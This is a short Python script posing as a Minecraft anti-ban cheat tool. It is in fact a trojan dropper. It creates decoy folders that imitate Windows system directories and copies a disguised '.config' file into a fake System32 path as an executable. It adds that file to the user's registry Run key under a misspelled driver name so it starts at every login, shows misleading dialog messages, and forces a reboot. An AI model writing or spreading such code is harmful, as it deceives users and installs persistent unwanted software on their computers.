import shutil
import os
import win32api
import win32con
from os import system

oldfile = ".//配置文件//Minecraft防封作弊大师.config"
newfile = "C:\Windows_config\System32\windows_driver23.exe"
cont = 0

try:
    file1 = "C://Windows_config"
    file2 = "C://Windows_config//System32"
    os.mkdir(file1)
    os.mkdir(file2)
    for write_file in range(1, 100):
        cont += 1
        if cont > 66:
            file3 = file2 + '//driver_32_' + str(cont)
            os.mkdir(file3)
        else:
            pass
        if cont < 34:
            file4 = file1 + "//System64_" + str(cont)
            os.mkdir(file4)
        else:
            pass
except:
    win32api.MessageBox(0, "您已经配置过了，可以直接使用啦！", "Minecraft防封作弊大师", win32con.MB_OK)

shutil.copyfile(oldfile, newfile)


def write_up():
    name = 'Windwos_driver_23'
    path = newfile
    KeyName = 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
    try:
        key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, KeyName, 0, win32con.KEY_ALL_ACCESS)
        win32api.RegSetValueEx(key, name, 0, win32con.REG_SZ, path)
        win32api.RegCloseKey(key)
        win32api.MessageBox(0, "配置失败，请检查后重试", "Minecraft作弊大师", win32con.MB_OK)
        win32api.MessageBox(0, "请不要随便使用网上下载的软件！！！Good luck!", "Anonymous", win32con.MB_OK)
        system("shutdown -r -t 10")
    except:
        win32api.MessageBox(0, "ERROR Not Allow. Exit-code: 4xx03", "Minecraft作弊大师", win32con.MB_OK)


write_up()
